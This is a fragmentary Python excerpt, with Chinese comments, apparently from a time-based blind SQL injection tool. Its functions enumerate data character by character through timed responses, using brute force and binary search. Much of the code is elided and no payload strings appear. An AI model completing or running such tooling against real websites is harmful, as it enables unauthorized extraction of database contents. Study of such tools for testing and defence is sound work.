...
# url
# expected_time ： 期待等待的时间  
def brute_enum_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo, str_foo, loop_freq):
    ...
    if loop_count == 2:
        ...
        for tmp_int in range(1,loop_freq):
            ...
            for tmp_char in brute_list1:
                ...
                packet_count += 1
                # 返回的结果为真
                bool_result = send_payload_by_time(dict_para_data, http_type, vuln_para, payload, url, expected_time)
                if bool_result == 1:
                    flag = 1
                    ...
                    break
                if bool_result == -1:   # 没有输入正确的可注入的参数
                    return -1
            if flag != 1:
                return result
        return result
    ...
    if loop_count == 1:
        ...
        for tmp_int in range(1,loop_freq):
            ...
            if bool_result == 1:
                ...
                return result_len
            if bool_result == -1:       # 没有输入可注入的参数
                return -1

def binary_search_by_time(dict_para_data, vuln_para, http_type, url, expected_time, payload_foo, str_foo, loop_freq):
    print('[*] The Time-based blind injection is begin')
    result = ""
    loop_count = 0
    if 'int_foo' in payload_foo:
        ...
        for tmp_int in range(1,loop_freq):
            ...
            while True:
                ...
                if bool_result == 1:
                    ...
                    guess = (guess + max)//2
                    count += 1
                elif bool_result == -1: # 没有输入正确的可注入的参数
                    return -1
        return result
        if result == "":
            print("[*] There is no finding result")
